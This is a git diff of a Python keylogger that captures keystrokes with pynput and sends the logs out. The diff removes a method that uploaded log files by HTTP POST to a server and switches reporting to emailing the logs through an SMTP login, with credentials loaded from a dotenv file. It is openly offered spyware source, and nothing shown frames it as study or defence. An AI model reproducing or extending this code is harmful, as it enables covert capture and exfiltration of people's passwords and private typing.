@@ -4,16 +4,14 @@ import platform
 import os
 import threading
 import smtplib
-import requests
-from unicodedata import name
 from pynput import keyboard
 from email.mime.multipart import MIMEMultipart
 from email.utils import formatdate, COMMASPACE
 from email.mime.application import MIMEApplication
 from datetime import datetime
+from dotenv import load_dotenv
 
-
-SERVER_URL = "127.0.0.1:8000"
+load_dotenv()
 
 class KeyLogger():
     def __init__(self, interval, stop) -> None:
@@ -90,16 +88,10 @@ class KeyLogger():
         server.login(email, password)
         server.sendmail(email, email, message.as_string())
 
-    def upload_file(self):
-        files = {"file": open(f"logs/{self.filename}.log", "rb")}        
-        response = requests.post(f"http://{SERVER_URL}/uploadfile/", files=files)
-        print(response.text)
-
     def report(self):
         self.end_time = datetime.now()
         if self.log_number > 0:
-            # self.send_mail()
-            self.upload_file()
+            self.send_mail()
             pass
         self.log_number += 1
         self.update_filename()
